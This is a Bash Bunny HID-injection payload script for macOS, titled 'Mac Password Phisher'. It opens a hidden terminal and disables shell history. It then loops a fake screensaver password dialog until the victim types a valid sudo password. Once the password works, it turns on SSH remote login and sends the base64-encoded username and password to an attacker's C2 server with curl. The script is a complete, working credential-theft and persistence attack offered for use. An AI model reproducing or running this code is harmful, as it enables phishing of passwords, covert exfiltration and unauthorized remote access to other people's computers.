#!/bin/bash
#
# Title:         Mac Password Phisher
# Author:        Ahhh & duffff
# Version:       1.01
#
# Prompts for user password, writes response to the apache logs on your C2 instance
#
# Blue...............Starting
# Amber..............Executing payload
# Green..............Finished
# Thanks to '@FuzzyNop', '@harmj0y', '@enigma0x3', and '@Killswitch-GUI' for the techniques used in this script
# If testing this script, you'll need to sudo -k to test more than once

LED B

LANGUAGE='us'
lootdir=loot/MacLoot

# Gimme a Keyboard please. Thanks.
ATTACKMODE HID STORAGE
LED R G

mkdir -p /root/udisk/$lootdir

# Get a terminal
QUACK DELAY 400
QUACK GUI SPACE
QUACK DELAY 300
QUACK STRING terminal
QUACK DELAY 200
QUACK ENTER
QUACK DELAY 400

# Make lootdir
# No need for a bash history during this session
QUACK STRING unset HISTFILE
QUACK ENTER
QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/phish
QUACK ENTER
QUACK DELAY 200
QUACK ENTER

# Shrink window
QUACK STRING osascript -e \'tell application \"Terminal\"\' -e \'set size of front window to {36, 36}\' -e \'set position of front window to {0, 25}\' -e end 

QUACK ENTER
QUACK DELAY 200
QUACK ENTER

# Execute Payload (and it just keeps asking, and it just keeps asking, and it just keeps asking, until you get it right)
QUACK STRING while true\; do
QUACK ENTER

# Test if we have the sudo password in logfile
QUACK STRING cat logfile \| sudo -S ls
QUACK ENTER

# If the test for sudo succeeds: enable ssh, add the user to the host file, and send it off to your c2 server
QUACK STRING if [ \"\$?\" -eq \"0\" ]\; then
QUACK ENTER
QUACK STRING sudo systemsetup -setremotelogin on
QUACK ENTER
QUACK STRING echo -n \"\:\" \$\(id -un\) \>\> logfile 
QUACK ENTER

# sends a GET request with the user agent, a base64'd value of the username and password
QUACK STRING curl -A \`base64 -i logfile\` #YourIPaddressHere
QUACK ENTER
QUACK STRING rm -rf logfile
QUACK ENTER
QUACK STRING clear
QUACK ENTER
QUACK STRING exit
QUACK ENTER
QUACK STRING fi
QUACK ENTER

# Screensaver phishing, saved locally to a file called logfile
QUACK STRING osascript -e \'tell app \"ScreenSaverEngine\" to activate\' -e \'tell app \"ScreenSaverEngine\" to display dialog \"ScreenSaver requires your password to continue.\" \& return  default answer \"\" with icon 1 with hidden answer with title \"ScreenSaver Alert\"\' \| cut -f3 -d\"\:\" \> logfile
QUACK ENTER
QUACK STRING done
QUACK ENTER
QUACK DELAY 1000

# Sync filesystem
sync

# Green is the official Light of "finished"
LED G
LED G
